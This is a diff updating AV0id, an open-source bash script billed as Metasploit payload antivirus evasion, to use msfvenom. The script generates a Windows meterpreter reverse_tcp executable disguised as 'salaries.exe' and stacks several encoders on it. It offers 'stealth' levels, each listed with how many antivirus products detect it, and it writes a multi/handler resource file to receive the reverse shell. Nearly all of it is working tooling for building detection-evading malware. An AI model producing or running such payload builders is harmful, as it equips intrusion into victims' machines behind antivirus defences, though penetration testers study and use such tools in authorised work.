@@ -1,11 +1,19 @@
 #!/usr/bin/env bash
-# AV0id - Metapsloit Payload Anti-Virus Avasion
+# AV0id - Metapsloit Payload Anti-Virus Evasion
 # Daniel Compton
 # www.commonexploits.com
 # info@commexploits.com
 # Twitter = @commonexploits
 # 05/2013
-# Tested on Bactrack 5 and Kali only.
+# Tested on Bactrack 5 and Kali only
+
+####################################################################################
+# Updated 08/2015
+# Removed Deprecated Commands in favor of MsfVenom
+# Jason Soto
+# www.jsitech.com
+# Twitter = @JsiTech
+# Tested on Kali Linux
 
 #####################################################################################
 # Released as open source by NCC Group Plc - http://www.nccgroup.com/
@@ -23,14 +31,13 @@
 # User options
 OUTPUTNAME="salaries.exe" # The payload exe created name
 PAYLOAD="windows/meterpreter/reverse_tcp" # The payload to use
-MSFPAYLOAD=`which msfpayload` # Path to the msfpayload script
-MSFENCODE=`which msfencode` # Path to the msfencode script
-MSFCLI=`which msfcli` # Path to the msfcli script
+MSFVENOM=`which msfvenom` # Path to the msfvenom script
+MSFCONSOLE=`which msfconsole` # Path to the msfconsole script
 
 # Script begins
 #===============================================================================
 
-VERSION="1.5"
+VERSION="2.0"
 
 # spinner for Metasploit Generator
 spinlong ()
@@ -84,7 +91,7 @@ else
 fi
 
 #Check for Metasploit
-if [[ "$MSFPAYLOAD" != "" || "$MSFENCODE" != "" || "$MSFCLI" != "" ]]; then
+if [[ "$MSFVENOM" != "" || "$MSFCONSOLE" != "" ]]; then
     echo ""
 else
     echo ""
@@ -132,7 +139,7 @@ fi
 ITER=`shuf -i 10-20 -n 1`
 
 echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
-echo -e "\e[01;31m[?]\e[00m What system do you want the Metasploit listenter to run on? Enter 1 or 2 and press enter"
+echo -e "\e[01;31m[?]\e[00m What system do you want the Metasploit listener to run on? Enter 1 or 2 and press enter"
 echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
 echo ""
 echo " 1. Use my current system and IP address"
@@ -186,7 +193,7 @@ echo -e "\e[01;32m[-]\e[00m Generating Metasploit payload, please wait..."
 echo ""
 spinlong
 #Payload creater
-$MSFPAYLOAD "$PAYLOAD" LHOST="$IP" LPORT="$PORT" EXITFUNC=thread R | $MSFENCODE -e x86/shikata_ga_nai -c $ITER -t raw 2>/dev/null | $MSFENCODE -e x86/jmp_call_additive -c $ITER -t raw 2>/dev/null | $MSFENCODE -e x86/call4_dword_xor -c $ITER -t raw 2>/dev/null |  $MSFENCODE -e x86/shikata_ga_nai -c $ITER -t c > msf.c 2>/dev/null
+$MSFVENOM -p "$PAYLOAD" LHOST="$IP" LPORT="$PORT" EXITFUNC=thread -f raw | $MSFVENOM -e x86/shikata_ga_nai -i $ITER -f raw 2>/dev/null | $MSFVENOM -e x86/jmp_call_additive -i $ITER -a x86 --platform linux -f raw 2>/dev/null | $MSFVENOM -e x86/call4_dword_xor -i $ITER -a x86 --platform win -f raw 2>/dev/null |  $MSFVENOM -e x86/shikata_ga_nai -i $ITER -a x86 --platform win -f c > msf.c 2>/dev/null
 echo ""
 echo ""
 # Menu
@@ -194,13 +201,13 @@ echo -e "\e[1;31m---------------------------------------------------------------
 echo -e "\e[01;31m[?]\e[00m How stealthy do you want the file? Enter 1, 2, 3, 4 or 5 and press enter"
 echo -e "\e[1;31m--------------------------------------------------------------------------------------------\e[00m"
 echo ""
-echo " 1. Normal - about 400K payoad  - fast compile - 13/46 A.V. products detected as malicious"
+echo " 1. Normal - about 400K payoad  - fast compile - 22/55 A.V. products detected as malicious"
 echo ""
-echo " 2. Stealth - about 1-2 MB payload - fast compile - 12/46 A.V. products detected as malicious"
+echo " 2. Stealth - about 1-2 MB payload - fast compile - 21/55 A.V. products detected as malicious"
 echo ""
-echo " 3. Super Stealth - about 10-20MB payload - fast compile - 11/46 A.V. detected as malicious"
+echo " 3. Super Stealth - about 10-20MB payload - fast compile - 20/55 A.V. detected as malicious"
 echo ""
-echo " 4. Insane Stealth - about 50MB payload - slower compile - 10/46 A.V. detected as malicious"
+echo " 4. Insane Stealth - about 50MB payload - slower compile - 19/55 A.V. detected as malicious"
 echo ""
 echo " 5. Desperate Stealth - about 100MB payload - slower compile - Not tested with A.V."
 echo ""
@@ -329,14 +336,24 @@ echo ""
 if [ "$INTEXT" = "1" ]; then
     echo -e "\e[01;32m[-]\e[00m Loading the Metasploit listener on \e[01;32m$IP:$PORT\e[00m, please wait..."
     echo ""
-    $MSFCLI exploit/multi/handler PAYLOAD="$PAYLOAD" LHOST="$IP" LPORT="$PORT" E 2>/dev/null
+    echo 'use exploit/multi/handler' >> msfhandler.rc
+    echo "set payload $PAYLOAD" >> msfhandler.rc
+    echo "set LHOST $IP" >> msfhandler.rc
+    echo "set LPORT $PORT" >> msfhandler.rc
+    echo 'exploit' >> msfhandler.rc
+    $MSFCONSOLE -r msfhandler.rc
 else
     echo ""
-    echo -e "\e[01;32m[-]\e[00m Run the following code on your listener system:"
+    echo -e "\e[01;32m[-]\e[00m Use msfhandler.rc as msfconsole resource on your listener system:"
     echo ""
+    echo 'use exploit/multi/handler' >> msfhandler.rc
+    echo "set payload $PAYLOAD" >> msfhandler.rc
+    echo "set LHOST $IP" >> msfhandler.rc
+    echo "set LPORT $PORT" >> msfhandler.rc
+    echo 'exploit' >> msfhandler.rc
     echo -e "\e[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
     echo ""
-    echo "$MSFCLI exploit/multi/handler PAYLOAD="$PAYLOAD" LHOST="$IP" LPORT="$PORT" E"
+    echo "$MSFCONSOLE -r msfhandler.rc"
     echo ""
     echo -e "\e[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
     echo ""
